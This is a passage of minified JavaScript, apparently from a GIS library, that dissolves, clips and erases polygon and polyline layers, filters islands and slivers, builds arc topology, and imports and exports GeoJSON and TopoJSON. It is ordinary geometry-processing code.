ne(It.aggregateDataRecords(e.data.getRecords(),o,n))),r={name:n.no_replace?null:e.name,data:i,shapes:a.map(s),geometry_type:e.geometry_type},bt.stop("dissolve2"),It.printDissolveMessage(e,r,"dissolve2"),r},It.concatShapes=function(e){return e.reduce(function(e,t){return It.extendShape(e,t),e},[])},It.extendShape=function(e,t){if(t)for(var n=0,r=t.length;r>n;n++)e.push(t[n])},It.getPolygonDissolver=function(e,t){t=t&&!e.arcs.isPlanar();var n=new Uint8Array(e.arcs.size()),r=It.getHoleDivider(e,t),i=It.getRingIntersector(e,"flatten",n,t),o=It.getRingIntersector(e,"dissolve",n,t);return function(e){if(!e)return null;var t=[],n=[];r(e,t,n),t=i(t),n.forEach(It.reversePath),n=i(n),n.forEach(It.reversePath);var a=It.appendHolestoRings(t,n),s=o(a);return s.length>0?s:null}},It.appendHolestoRings=function(e,t){for(var n=0,r=t.length;r>n;n++)e.push(t[n]);return e},It.clipPolygons=function(e,t,n,r){function i(e,t,n){var r=[],i="clip"==t,o="erase"==t;return It.openArcRoutes(e,d,g,!0,!1,!1),It.forEachPath(e,function(e){for(var t,a=0,s=e.length;s>a;a++)if(m=0,y=0,t=x(e[a]))if(0===m||0===y){var u=n.pathIsEnclosed(t);(i&&u||o&&!u)&&r.push(t)}else r.push(t)}),It.closeArcRoutes(e,d,g,!0,!0,!0),v.length>0&&(It.closeArcRoutes(v,d,g,!0,!0,!0),v=[]),0===r.length?null:r}function o(e){var t=e>=0,n=t?e:~e,r=t?1:16,i=g[n],o=h[n];return o>0&&m++,(i&r)>0||(o&r)>0}function a(e){var t,n,i=e>=0,o=i?e:~e,a=g[o],s=h[o];i?(t=a,n=s):(t=a>>4,n=s>>4),t&=3,n&=3;var u=!1;return 3==t?1==n||2==n&&"erase"==r||(u=!0):0===t&&3==n&&(v.push(e),u=!0),u&&(3==n&&y++,a=i?It.setBits(a,1,3):It.setBits(a,16,48)),a|=i?4:64,g[o]=a,u}function s(e,t,n,r,i){var o=1;if(t==r){var a=It.getRouteBits(n,g);3==a&&(o=2)}else t>r&&(o=2);return o}function u(e){return e.map(function(e){var t=[];return It.forEachPath(e,function(e){for(var n=!0,r=!1,i=0;i<e.length;i++){if(!l(e[i],g)){n=!1;break}!r&&f(e[i],h)&&(r=!0)}n&&r&&t.push(e)}),t.length>0?t:null})}function l(e,t){var n=c(e),r=t[n];return 0===(68&r)}function f(e,t){var n=t[c(e)];return(17&n)>0}function p(e,t,n){var r=n.findPathsInsideShape(e),i=[];return r?("erase"==t&&r.forEach(It.reversePath),r.length<=1?i=r:(It.openArcRoutes(r,d,g,!0,!1,!0),r.forEach(function(e){for(var t,n,r=0;n>r;++r)t=x(e[r]),t&&i.push(t)})),i.length>0?i:null):null}var d=n.arcs,h=new Uint8Array(d.size()),g=new Uint8Array(d.size()),m=0,y=0,v=[],x=It.getPathFinder(n,a,o,s),b=It.getPolygonDissolver(n);e=e.map(b),t=[b(It.concatShapes(t))],It.openArcRoutes(t,d,h,"clip"==r,"erase"==r,!0,17);var S=new Q(t,d),P=e.map(function(e){return e?i(e,r,S):null}),w=u(t);return It.closeArcRoutes(t,d,g,!0,!0),S=new Q(w,d),e.forEach(function(e,t){var n=e?p(e,r,S):null;n&&(P[t]=(P[t]||[]).concat(n))}),P},It.clipPolylines=function(e,t,n,r){function i(e){var t=e.reduce(o,[]);return t.length>0?t:null}function o(e,t){for(var n,i,o=null,s=0,u=t.length;u>s;++s)n=t[s],i=a.arcIsEnclosed(n),i&&"clip"==r||!i&&"erase"==r?(o||e.push(o=[]),o.push(n)):o=null;return e}var a=new Q(t,n.arcs);return e.map(function(e){return i(e)})},It.clipPoints=function(e,t,n,r){var i=new Q(t,n),o=e.reduce(function(e,t){for(var n,o=t?t.length:0,a=[],s=0;o>s;++s)n=i.findEnclosingShape(t[s])>-1,("clip"==r&&n||"erase"==r&&!n)&&a.push(t[s].concat());return e.push(a.length>0?a:null),e},[]);return o},It.dissolveArcs=function(e){function t(e){for(var t,r,l,f,p,d,h=0,g=[],m=0,y=e.length;y>m;m++)r=e[m],l=c(r),p=r===l,n.arcIsDegenerate(r)||(0===u[l]?(f=n.getArcLength(r),t&&i(e[m-1],r)?(f>0&&f--,t.push(r),u[l]=1):(t=[r],s[l]=o.length,o.push(t),u[l]=p?2:3),h+=f):t=null),u[l]>1&&(d=s[l],(p&&3==u[l]||!p&&2==u[l])&&(d=~d),g.push(d));return a+=h,g}var n=e.arcs,r=e.layers.filter(It.layerHasPaths),i=It.getArcDissolveTest(r,n),o=[],a=0,s=new Int32Array(n.size()),u=new Uint8Array(n.size());r.forEach(function(e){e.shapes=e.shapes.map(function(e){return It.editPaths(e&&e.concat(),t)})}),It.dissolveArcCollection(n,o,a)},It.dissolveArcCollection=function(e,t,n){function r(e,t){var n=c(e),r=0>e,f=s.nn[n],p=s.ii[n],d=i[t];f>0&&(d>0&&(f--,r||p++),yt.copyElements(s.xx,p,o,l,f,r),yt.copyElements(s.yy,p,a,l,f,r),u&&yt.copyElements(s.zz,p,u,l,f,r),i[t]+=f,l+=f)}var i=new Uint32Array(t.length),o=new Float64Array(n),a=new Float64Array(n),s=e.getVertexData(),u=s.zz?new Float64Array(n):null,l=0;t.forEach(function(e,t){e.forEach(function(e,n){r(e,t)})}),e.updateVertexData(i,o,a,u)},It.getArcDissolveTest=function(e,t){function n(e,t){o++,r=e}var r,i=It.getFilteredNodeCollection(e,t),o=0;return function(e,t){return e==t||e==~t?(u("Unexpected arc sequence:",e,t),!1):(o=0,i.forEachConnectedArc(e,n),1==o&&r==~t)}},It.getFilteredNodeCollection=function(e,t){var n=It.countArcReferences(e,t),r=function(e){return n[c(e)]>0};return new ee(t,r)},It.countArcReferences=function(e,t){var n=new Uint32Array(t.size());return e.forEach(function(e){It.countArcsInShapes(e.shapes,n)}),n},wt.filterFeatures=function(e,t,n){var r,i=e.data?e.data.getRecords():null,a=e.shapes||null,u=It.getFeatureCount(e),l=a?[]:null,c=i?[]:null,f=It.getOutputLayer(e,n);return n.expression&&(r=It.compileValueExpression(n.expression,e,t)),n.remove_empty&&(r=It.combineFilters(r,It.getNullGeometryFilter(e,t))),r||o("[filter] Missing a filter expression"),yt.repeat(u,function(e){var t=r(e);t===!0?(a&&l.push(a[e]||null),i&&c.push(i[e]||null)):t!==!1&&o("[filter] Expression must return true or false")}),f.shapes=l,f.data=c?new ne(c):null,n.no_replace&&(f=It.copyLayer(f)),n.verbose!==!1&&s(yt.format("[filter] Retained %,d of %,d features",It.getFeatureCount(f),u)),f},It.getNullGeometryFilter=function(e,t){var n=e.shapes;return"polygon"==e.geometry_type?It.getEmptyPolygonFilter(n,t):function(e){return!!n[e]}},It.getEmptyPolygonFilter=function(e,t){return function(n){var r=e[n];return!!r&&_t.getPlanarShapeArea(e[n],t)>0}},It.combineFilters=function(e,t){return e&&t&&function(n){return e(n)&&t(n)}||e||t},wt.filterIslands=function(e,t,n){var r=0;"polygon"==e.geometry_type&&(n.min_area||n.min_vertices?(n.min_area&&(r+=It.filterIslands(e,t,It.getMinAreaTest(n.min_area,t))),n.min_vertices&&(r+=It.filterIslands(e,t,It.getVertexCountTest(n.min_vertices,t))),n.remove_empty&&wt.filterFeatures(e,t,{remove_empty:!0,verbose:!1}),s(yt.format("Removed %'d island%s",r,yt.pluralSuffix(r)))):s("[filter-islands] Missing a criterion for filtering islands; use min-area or min-vertices"))},It.getVertexCountTest=function(e,t){return function(n){return _t.countVerticesInPath(n,t)<=e}},It.getMinAreaTest=function(e,t){var n=t.isPlanar()?_t.getPlanarPathArea:_t.getSphericalPathArea;return function(r){var i=n(r,t);return Math.abs(i)<e}},It.filterIslands=function(e,t,n){var r=0,i=new Uint8Array(t.size());It.countArcsInShapes(e.shapes,i);var o=function(e,o,a){return 1!=e.length||1!==i[c(e[0])]||n&&!n(e)||It.ringHasHoles(e,a,t)?void 0:(r++,null)};return It.filterShapes(e.shapes,o),r},It.ringIntersectsBBox=function(e,t,n){for(var r=0,i=e.length;i>r;r++)if(n.arcIntersectsBBox(c(e[r]),t))return!0;return!1},It.ringHasHoles=function(e,t,n){for(var r,i,o=n.getSimpleShapeBounds2(e),a=0,s=t.length;s>a;a++)if(r=t[a],r&&r!=e&&It.ringIntersectsBBox(r,o,n)&&(i=n.getVertex(r[0],0),_t.testPointInRing(i.x,i.y,e,n)))return!0;return!1},It.filterShapes=function(e,t){for(var n=function(e){return It.editPaths(e,t)},r=0,i=e.length;i>r;r++)e[r]=n(e[r])},wt.filterSlivers=function(e,t,n){return"polygon"!=e.geometry_type?0:It.filterSlivers(e,t,n)},It.filterSlivers=function(e,t,n){var r=n&&n.min_area?It.getMinAreaTest(n.min_area,t):It.getSliverTest(t),i=0,o=function(e,t,n){return r(e)?(i++,null):void 0};return It.filterShapes(e.shapes,o),i},It.filterClipSlivers=function(e,t,n){var r=new Uint8Array(n.size()),i=It.getSliverTest(n),o=0,a=function(e){for(var t=0,n=0,a=0,s=e&&e.length||0;s>a;a++)r[c(e[a])]>0?n++:t++;return n>0&&t>0&&i(e)?(o++,null):void 0};return It.countArcsInShapes(t.shapes,r),It.filterShapes(e.shapes,a),o},It.getSliverTest=function(e){var t=It.calcMaxSliverArea(e);return function(n){return Math.abs(_t.getPlanarPathArea(n,e))<=t}},It.calcMaxSliverArea=function(e){var t=2,n=e.getBounds().width()/t,r=e.getBounds().height()/t,i=0,o=0;return e.forEachSegment(function(e,t,a,s){var u=Math.abs(a[e]-a[t]),l=Math.abs(s[e]-s[t]);n>u&&r>l&&(o+=(Math.sqrt(u*u+l*l)-o)/++i)}),o*o},wt.clipLayers=function(e,t,n,r){return It.clipLayers(e,t,n,"clip",r)},wt.eraseLayers=function(e,t,n,r){return It.clipLayers(e,t,n,"erase",r)},wt.clipLayer=function(e,t,n,r){return wt.clipLayers([e],t,n,r)[0]},wt.eraseLayer=function(e,t,n,r){return wt.eraseLayers([e],t,n,r)[0]},It.clipLayers=function(e,t,n,r,i){var a,s;return i=i||{no_cleanup:!0},a=It.findClippingLayer(t,n),a?s=n:(s=i.bbox?It.convertClipBounds(i.bbox):It.loadExternalClipLayer(t,i),s&&1==s.layers.length||o("[clip/erase] Missing clipping data"),a=s.layers[0]),It.requirePolygonLayer(a,"["+r+"] Requires a polygon clipping layer"),It.clipLayersByLayer(e,n,a,s,r,i)},It.clipLayersByLayer=function(e,t,n,r,i,a){var u,l,c,f=yt.some(e,It.layerHasPaths),p=t!=r,d=0,h=0;return p?(c=It.mergeDatasets([t,r]),wt.buildTopology(c),t.arcs=c.arcs):c=t,f&&(u=It.divideArcs(c)),l=e.map(function(e){var r,s,l=e.shapes?e.shapes.length:0;return e===n?o("["+i+"] Can't clip a layer with itself"):"point"==e.geometry_type?r=It.clipPoints(e.shapes,n.shapes,c.arcs,i):"polygon"==e.geometry_type?r=It.clipPolygons(e.shapes,n.shapes,u,i):"polyline"==e.geometry_type?r=It.clipPolylines(e.shapes,n.shapes,u,i):o("["+i+"] Invalid target layer:",e.name),s=It.getOutputLayer(e,a),a.no_replace&&e.data&&(s.data=e.data.clone()),s.shapes=r,a.remove_slivers&&"polygon"==s.geometry_type&&(h+=It.filterClipSlivers(s,n,t.arcs)),wt.filterFeatures(s,t.arcs,{remove_empty:!0,verbose:!1}),d+=l-s.shapes.length,s}),a.no_replace?t.layers=t.layers.concat(l):It.replaceLayers(t,e,l),f&&!a.no_cleanup&&It.dissolveArcs(t),d&&h&&s(It.getClipMessage(i,d,h)),l},It.getClipMessage=function(e,t,n){var r=t?yt.format("%,d null feature%s",t,yt.pluralSuffix(t)):"",i=n?yt.format("%,d sliver%s",n,yt.pluralSuffix(n)):"";return r||i?yt.format("[%s] Removed %s%s%s",e,r,r&&i?" and ":"",i):""},It.findClippingLayer=function(e,t){var n,r;return yt.isObject(e)&&yt.contains(t.layers,e)?r=e:yt.isString(e)&&(n=It.findMatchingLayers(t.layers,e),n.length>1?o("[clip/erase] Received more than one source layer"):1==n.length&&(r=n[0])),r||null},It.loadExternalClipLayer=function(e,t){var n=wt.importFile(e,yt.defaults({no_topology:!0},t));return n||o("Unable to find file ["+e+"]"),1!=n.layers.length&&o("Clip/erase only supports clipping with single-layer datasets"),n},It.convertClipBounds=function(e){var t=e[0],n=e[1],r=e[2],i=e[3],a=[[t,n],[t,i],[r,i],[r,n],[t,n]];return i>n&&r>t||o("[clip/erase] Invalid bbox (should be [xmin, ymin, xmax, ymax]):",e),{arcs:new Z([a]),layers:[{shapes:[[[0]]],geometry_type:"polygon"}]}};var Nt={};Nt.ID_FIELD="FID",Nt.typeLookup={LineString:"polyline",MultiLineString:"polyline",Polygon:"polygon",MultiPolygon:"polygon",Point:"point",MultiPoint:"point"},Nt.translateGeoJSONType=function(e){return Nt.typeLookup[e]||null},wt.buildTopology=function(e){if(e.arcs){var t=e.arcs.getVertexData(),n=It.buildPathTopology(t.nn,t.xx,t.yy);e.arcs.updateVertexData(n.nn,n.xx,n.yy),e.layers.forEach(function(e){("polyline"==e.geometry_type||"polygon"==e.geometry_type)&&(e.shapes=It.replaceArcIds(e.shapes,n.paths))})}},It.buildPathTopology=function(e,t,n){function r(){return!(!t.subarray||!n.subarray)}function o(e){for(var t,n=[],r=0,i=0,o=e.length;o>i;i++)t=e[i],n.push(2>t?null:l(r,r+t-1)),r+=t;return n}function a(t){var n=b[t],r=t+1;if(v>r&&b[r]===n)return t+1;var i=e[n];return u(t,t-i+1)?t-i+2:-1}function s(t){var n=b[t],r=t-1;if(r>=0&&b[r]===n)return t-1;var i=e[n];return u(t,t+i-1)?t+i-2:-1}function u(e,r){return t[e]==t[r]&&n[e]==n[r]}function l(e,t){for(var n,r=[],o=-1,a=e;t>a;a++)c(a)&&(o>-1?r.push(h(n,a)):o=a,n=a);return-1==o?r.push(g(e,t)):o==e?(c(t)||i("Topology error"),r.push(h(n,a))):r.push(d(n,t,e+1,o)),r}function c(e){var t,n,r=x[e],i=s(e),o=a(e);if(-1==i||-1==o)return!0;for(;e!=r;){if(t=s(r),n=a(r),-1==t||-1==n||f(i,o,t,n))return!0;r=x[r]}return!1}function f(e,r,i,o){var a=t[e],s=t[r],u=t[i],l=t[o],c=n[e],f=n[r],p=n[i],d=n[o];return a==l&&s==u&&c==d&&f==p||a==u&&s==l&&c==p&&f==d?!1:!0}function p(e,t,n,i,o){var a,s=n-t+o-i+2,u=r()?Float64Array:Array,l=new u(s),c=0;for(a=t;n>=a;a++)l[c++]=e[a];for(a=i;o>=a;a++)l[c++]=e[a];return l}function d(e,r,i,o){var u=S.findMatchingArc(t,n,e,o,a,s);return null===u&&(u=S.addArc(p(t,e,r,i,o),p(n,e,r,i,o))),u}function h(e,r){var i=S.findMatchingArc(t,n,e,r,a,s);return null===i&&(i=S.addArc(P.call(t,e,r+1),P.call(n,e,r+1))),i}function g(r,o){for(var u,l=x[r],c=b[r];l!=r&&!(b[l]<c);)l=x[l];if(l==r)return h(r,o);for(var f=r;o>f;f++)if(u=S.findMatchingArc(t,n,f,f,a,s),null!==u)return u;i("Unmatched ring; id:",c,"len:",e[c])}var m,y,v=t.length,x=me(t,n),b=ye(v,e),S=new he(v),P=r()?t.subarray:Array.prototype.slice;return m=o(e),y=S.getVertexData(),y.paths=m,y},It.replaceArcIds=function(e,t){function n(e,t){return e?e.map(function(e){return r(e,t)}):null}function r(e,t){return e.reduce(function(e,n){var r=c(n),i=t[r];if(i){0>n&&(i=i.concat(),It.reversePath(i));for(var o=0,a=i.length;a>o;o++)e.push(i[o])}return e},[])}return e.map(function(e){return n(e,t)})},It.getHighPrecisionSnapInterval=function(e){var t=e.getBounds();if(!t.hasBounds())return 0;var n=Math.max(Math.abs(t.xmin),Math.abs(t.ymin),Math.abs(t.xmax),Math.abs(t.ymax));return 1e-14*n},It.snapCoords=function(e,t){var n=It.getAvgSegment(e),r=.0025*n,i=r;t>0&&(i=t,s(yt.format("Applying snapping threshold of %s -- %.6f times avg. segment length",t,t/n)));var o=It.snapCoordsByInterval(e,i);o>0&&e.dedupCoords(),s(yt.format("Snapped %s point%s",o,yt.pluralSuffix(o)))},It.snapCoordsByInterval=function(e,t){function n(e,t,n,r,i){for(var o,a,s,u=e,l=n.length,c=r[n[e]],f=i[n[e]],p=0;++u<l&&(o=n[u],a=r[o]-c,!(a>t));)s=i[o]-f,0===a&&0===s||a*a+s*s>t*t||(r[o]=c,i[o]=f,p++);return p}for(var r=0,i=e.getVertexData(),o=yt.sortCoordinateIds(i.xx),a=0,s=o.length;s>a;a++)r+=n(a,t,o,i.xx,i.yy);return r},yt.sortCoordinateIds=function(e){for(var t=e.length,n=new Uint32Array(t),r=0;t>r;r++)n[r]=r;return yt.quicksortIds(e,n,0,n.length-1),n},yt.quicksortIds=function(e,t,n,r){if(r-n>24){for(var i,o=e[t[n+r>>1]],a=n,s=r;s>=a;){for(;e[t[a]]<o;)a++;for(;e[t[s]]>o;)s--;s>=a&&(i=t[a],t[a]=t[s],t[s]=i,a++,s--)}s>n&&yt.quicksortIds(e,t,n,s),r>a&&yt.quicksortIds(e,t,a,r)}else yt.insertionSortIds(e,t,n,r)},yt.insertionSortIds=function(e,t,n,r){var i,o,a;for(a=n+1;r>=a;a++){for(i=t[a],o=a-1;o>=n&&e[i]<e[t[o]];o--)t[o+1]=t[o];t[o+1]=i}},It.importGeoJSON=function(e,t){var n,r,i,a,s=yt.isString(e)?JSON.parse(e):e,u=Object.keys(Nt.pathImporters),l=t.id_field||Nt.ID_FIELD,c=null;return r="Feature"==s.type?{type:"FeatureCollection",features:[s]}:yt.contains(u,s.type)?{type:"GeometryCollection",geometries:[s]}:s,"FeatureCollection"==r.type?(c=[],n=r.features.map(function(e){var t=e.properties||{};return"id"in e&&(t[l]=e.id),c.push(t),e.geometry})):"GeometryCollection"==r.type?n=r.geometries:o("[i] Unsupported GeoJSON type:",r.type),n||o("[i] Missing geometry data"),i=new xe(t),n.forEach(function(e){i.startShape(),e&&Nt.importGeometry(e,i)}),a=i.done(),c&&(a.layers[0].data=new ne(c)),It.importCRS(a,s),a},Nt.importGeometry=function(e,t){var n=e.type;n in Nt.pathImporters?Nt.pathImporters[n](e.coordinates,t):"GeometryCollection"==n?e.geometries.forEach(function(e){Nt.importGeometry(e,t)}):u("TopoJSON.importGeometryCollection() Unsupported geometry type:",e.type)},Nt.pathImporters={LineString:function(e,t){t.importLine(e)},MultiLineString:function(e,t){for(var n=0;n<e.length;n++)Nt.pathImporters.LineString(e[n],t)},Polygon:function(e,t){for(var n=0;n<e.length;n++)t.importRing(e[n],n>0)},MultiPolygon:function(e,t){for(var n=0;n<e.length;n++)Nt.pathImporters.Polygon(e[n],t)},Point:function(e,t){t.importPoints([e])},MultiPoint:function(e,t){t.importPoints(e)}},It.importCRS=function(e,t){"crs"in t&&(e.info.input_crs=t.crs)},It.getFormattedStringify=function(e){function t(e,t){if(e in n&&yt.isArray(t)){var i=JSON.stringify(t);if(i.indexOf(!1))return r+i.replace(/,/g,", ")+r}return t}var n=yt.arrayToIndex(e),r="က⿕̐",i=new RegExp('"'+r+"|"+r+'"',"g"),o="	";return function(e){var n=JSON.stringify(e,t,o);return n.replace(i,"")}},It.exportPointData=function(e){var t,n;return e&&0!==e.length?(n={points:e,pointCount:e.length,bounds:_t.getPathBounds(e)},t={bounds:n.bounds,pathData:[n],partCount:1,pointCount:n.pointCount}):t={partCount:0,pointCount:0},t},It.exportPathData=function(e,n,r){if("point"==r)return It.exportPointData(e);var i=0,o=new t,a=[];return!e||"polyline"!=r&&"polygon"!=r||e.forEach(function(e,t){var s=n.getShapeIter(e),l=It.exportPathCoords(s),c=!0;"polygon"==r?(l.area=_t.getPlanarPathArea2(l.points),c=l.pointCount>3&&0!==l.area):"polyline"==r&&(c=l.pointCount>1),c?(i+=l.pointCount,l.bounds=_t.getPathBounds(l.points),o.mergeBounds(l.bounds),a.push(l)):u("Skipping a collapsed",r,"path")}),{pointCount:i,pathData:a,pathCount:a.length,bounds:o}},It.exportPathCoords=function(e){for(var t,n,r,i,o=[],a=0;e.hasNext();)t=e.x,n=e.y,(0===a||r!=t||i!=n)&&(o.push([t,n]),a++),r=t,i=n;return{points:o,pointCount:o.length}},It.exportGeoJSON=function(e,t){var n="json";return t.output_file&&(n=yt.getFileExtension(t.output_file)),e.layers.map(function(r){return{content:It.exportGeoJSONCollection(r,e,t,!0),filename:r.name?r.name+"."+n:""}})},It.exportGeoJSONCollection=function(e,t,n,r){n=n||{};var o,a,s,u,l=It.exportProperties(e.data,n),c=e.shapes,f=It.exportIds(e.data,n),p=!(!l&&!f),d={};return l&&c&&l.length!==c.length&&i("[-o] Mismatch between number of properties and number of shapes"),r&&(u=n.prettify?It.getFormattedStringify(["bbox","coordinates"]):JSON.stringify),p?(d.type="FeatureCollection",a="features"):(d.type="GeometryCollection",a="geometries"),It.exportCRS(t,d),n.bbox&&(s=It.getLayerBounds(e,t.arcs),s.hasBounds()&&(d.bbox=s.toArray())),o=(c||l||[]).reduce(function(n,i,o){var a=c?c[o]:null,s=Nt.exporters[e.geometry_type],d=a?s(a,t.arcs):null;if(p)d={type:"Feature",geometry:d,properties:l?l[o]:null},f&&(d.id=f[o]);else if(!d)return n;return r&&(d=u(d)),n.push(d),n},[]),r?(d[a]=["$"],d=JSON.stringify(d).replace('"$"',"\n"+o.join(",\n")+"\n")):d[a]=o,d},Nt.exportPointGeom=function(e,t){var n=null;return 1==e.length?n={type:"Point",coordinates:e[0]}:e.length>1&&(n={type:"MultiPoint",coordinates:e}),n},Nt.exportLineGeom=function(e,t){var n=It.exportPathData(e,t,"polyline");if(0===n.pointCount)return null;var r=n.pathData.map(function(e){return e.points});return 1==r.length?{type:"LineString",coordinates:r[0]}:{type:"MultiLineString",coordinates:r}},Nt.exportPolygonGeom=function(e,t){var n=It.exportPathData(e,t,"polygon");if(0===n.pointCount)return null;var r=It.groupPolygonRings(n.pathData),i=r.map(function(e){return e.map(function(e){return e.points})});return 1==i.length?{type:"Polygon",coordinates:i[0]}:{type:"MultiPolygon",coordinates:i}},Nt.exporters={polygon:Nt.exportPolygonGeom,polyline:Nt.exportLineGeom,point:Nt.exportPointGeom},It.exportCRS=function(e,t){var n=e.info||{};"output_crs"in n?t.crs=n.output_crs:"input_crs"in n&&(t.crs=n.input_crs)},It.getIdField=function(e,t){var n=[];return yt.isString(t)?n.push(t):yt.isArray(t)&&(n=t),n.push(Nt.ID_FIELD),yt.find(n,function(t){return yt.contains(e,t)})},It.exportProperties=function(e,t){var n,r,i=e?e.getFields():[],o=It.getIdField(i,t.id_field),a=o==Nt.ID_FIELD;return t.drop_table||t.cut_table||0===i.length||a&&1==i.length?null:(r=e.getRecords(),n=a?r.map(function(e){return e=yt.extend({},e),delete e[o],e}):r)},It.exportIds=function(e,t){var n=e?e.getFields():[],r=It.getIdField(n,t.id_field);return r?e.getRecords().map(function(e){return r in e?e[r]:null}):null};var Lt={};Lt.forEachPath=function(e,t){function n(e){e.type in i&&i[e.type](e)}function r(e){for(var n,r=0;r<e.length;r++)n=t(e[r]),n&&(e[r]=n)}var i={GeometryCollection:function(e){e.geometries.forEach(n)},LineString:function(e){var n=t(e.arcs);n&&(e.arcs=n)},MultiLineString:function(e){r(e.arcs)},Polygon:function(e){r(e.arcs)},MultiPolygon:function(e){e.arcs.forEach(r)}};n(e)},Lt.forEachArc=function(e,t){Lt.forEachPath(e,function(e){for(var n,r=0;r<e.length;r++)n=t(e[r]),yt.isInteger(n)&&(e[r]=n)})},It.importTopoJSON=function(e,t){var n,r,i=[];return yt.isString(e)&&(e=JSON.parse(e)),e.arcs&&e.arcs.length>0&&(e.transform&&Lt.decodeArcs(e.arcs,e.transform),t&&t.precision&&Lt.roundCoords(e.arcs,t.precision),r=new Z(e.arcs)),yt.forEachProperty(e.objects,function(e,n){var o=Lt.importObject(e,t);It.layerHasPaths(o)&&It.cleanShapes(o.shapes,r,o.geometry_type),o.name=n,i.push(o)}),n={layers:i,arcs:r,info:{}},It.importCRS(n,e),n},Lt.decodeArcs=function(e,t){var n=t.scale[0],r=t.scale[1],i=t.translate[0],o=t.translate[1];e.forEach(function(e){for(var t,a,s,u=0,l=0,c=0,f=e.length;f>c;c++)t=e[c],a=t[0]+u,s=t[1]+l,t[0]=a*n+i,t[1]=s*r+o,u=a,l=s})},Lt.roundCoords=function(e,t){var n,r=m(t);e.forEach(function(e){for(var t=0,i=e.length;i>t;t++)n=e[t],n[0]=r(n[0]),n[1]=r(n[1])})},Lt.importObject=function(e,t){return"GeometryCollection"!=e.type&&(e={type:"GeometryCollection",geometries:[e]}),Lt.importGeometryCollection(e,t)},Lt.importGeometryCollection=function(e,t){var n=new Lt.GeometryImporter(t);return e.geometries.forEach(n.addGeometry,n),n.done()},Lt.GeometryImporter=function(e){var t=e&&e.id_field||Nt.ID_FIELD,n=[],r=[],i=null;this.addGeometry=function(e){var i=Nt.translateGeoJSONType(e.type),o=r.length,a=e.properties,s=null;"id"in e&&(a=a||{},a[t]=e.id),a&&(n[o]=a),"point"==i?s=this.importPointGeometry(e):e.type in Lt.pathImporters?s=Lt.pathImporters[e.type](e.arcs):e.type&&u("[TopoJSON] Unknown geometry type:",e.type),r.push(s),this.updateCollectionType(i)},this.importPointGeometry=function(e){var t=null;return"Point"==e.type?t=[e.coordinates]:"MultiPoint"==e.type?t=e.coordinates:o("Invalid TopoJSON point geometry:",e),t},this.updateCollectionType=function(e){i?e&&i!=e&&(i="mixed"):i=e},this.done=function(){var e={};return i&&(e.geometry_type=i,e.shapes=r),n.length>0&&(e.data=new ne(n)),e}},Lt.pathImporters={LineString:function(e){return[e]},MultiLineString:function(e){return e},Polygon:function(e){return e},MultiPolygon:function(e){return e.reduce(function(e,t){return e?e.concat(t):t},null)}},Lt.getPresimplifyFunction=function(e){var t=1e4,n=t/e;return function(e){return e===1/0?0:Math.ceil(e*n)}},wt.explodeFeatures=function(e,t,n){var r=e.data?e.data.getRecords():null,i=r?[]:null,o=[],a=yt.extend({},e);return e.shapes.forEach(function(n,s){var u;if(n?(u="polygon"==e.geometry_type&&n.length>1?It.explodePolygon(n,t):It.explodeShape(n),yt.merge(o,u)):o.push(null),a.shapes=o,i)for(var l=0,c=u?u.length:1;c>l;l++)i.push(It.cloneProperties(r[s]))}),a.shapes=o,i&&(a.data=new ne(i)),a},It.explodeShape=function(e){return e.map(function(e){return[e.concat()]})},It.explodePolygon=function(e,t){var n=It.getPathMetadata(e,t,"polygon"),r=It.groupPolygonRings(n);return r.map(function(e){return e.map(function(e){return e.ids})})},It.cloneProperties=function(e){var t={};for(var n in e)t[n]=e[n];return t},It.exportTopoJSON=function(e,t){var n=Lt.exportTopology(e,t),r=JSON.stringify,i=t.output_file||yt.getOutputFileBase(e)+".json";return t.prettify&&(r=It.getFormattedStringify("coordinates,arcs,bbox,translate,scale".split(","))),[{content:r(n),filename:i}]},Lt.exportTopology=function(e,t){var n,r=t.cloned?e:Lt.copyDatasetForExport(e),i=r.arcs,o={type:"Topology"};return It.datasetHasPaths(r)?(n=It.getDatasetBounds(r),t.bbox&&n.hasBounds()&&(o.bbox=n.toArray()),t.presimplify&&!r.arcs.getVertexData().zz&&wt.simplify(r,t),t.no_quantization||(o.transform=Lt.transformDataset(r,n,t)),It.dissolveArcs(r),o.arcs=Lt.exportArcs(i,n,t),o.transform&&Lt.deltaEncodeArcs(o.arcs)):o.arcs=[],o.objects=r.layers.reduce(function(e,n,r){var o=n.name||"layer"+(r+1);return e[o]=Lt.exportLayer(n,i,t),e},{}),It.exportCRS(r,o),o},Lt.copyDatasetForExport=function(e){var t={info:e.info};return t.layers=e.layers.map(function(e){var t=e.shapes?e.shapes.concat():null;return yt.defaults({shapes:t},e)}),e.arcs&&(t.arcs=e.arcs.getFilteredCopy()),t},Lt.transformDataset=function(e,t,n){var r=Lt.calcExportBounds(t,e.arcs,n),i=t.getTransform(r),o=i.invert();return e.arcs.transformPoints(function(e,t){var n=i.transform(e,t);return[Math.round(n[0]),Math.round(n[1])]}),{scale:[o.mx,o.my],translate:[o.bx,o.by]}},Lt.exportArcs=function(e,t,n){var r=null,i=[];return n.presimplify&&(r=Lt.getPresimplifyFunction(t.width())),e.forEach2(function(e,t,n,o,a){for(var s,u=[],l=e+t;l>e;e++)s=[n[e],o[e]],r&&s.push(r(a[e])),u.push(s);i.push(u.length>1?u:null)}),i},Lt.deltaEncodeArcs=function(e){e.forEach(function(e){for(var t,n,r,i,o,a=0,s=e.length;s>a;a++)o=e[a],r=o[0],i=o[1],a>0&&(o[0]=r-t,o[1]=i-n),t=r,n=i})},Lt.calcExportResolution=function(e,t){var n=It.getAvgSegment2(e);return[n[0]*t,n[1]*t]},Lt.calcExportBounds=function(e,n,r){var i,o,a;return i=r.topojson_precision>0?Lt.calcExportResolution(n,r.topojson_precision):r.quantization>0?[e.width()/(r.quantization-1),e.height()/(r.quantization-1)]:r.precision>0?[r.precision,r.precision]:Lt.calcExportResolution(n,.02),o=Math.ceil(e.width()/i[0]),a=Math.ceil(e.height()/i[1]),new t(0,0,o,a)},Lt.exportProperties=function(e,t,n){var r=It.exportProperties(t,n),i=It.exportIds(t,n);e.forEach(function(e,t){r&&(e.properties=r[t]),i&&(e.id=i[t])})},Lt.exportLayer=function(e,t,n){for(var r=It.getFeatureCount(e),i=[],o=0;r>o;o++)i[o]={type:null};return It.layerHasGeometry(e)&&Lt.exportGeometries(i,e.shapes,t,e.geometry_type),e.data&&Lt.exportProperties(i,e.data,n),{type:"GeometryCollection",geometries:i}},Lt.exportGeometries=function(e,t,n,r){var i=Lt.exporters[r];i&&t&&t.forEach(function(t,r){t&&t.length>0&&(e[r]=i(t,n))})},Lt.exportPolygonGeom=function(e,t){var n={};return 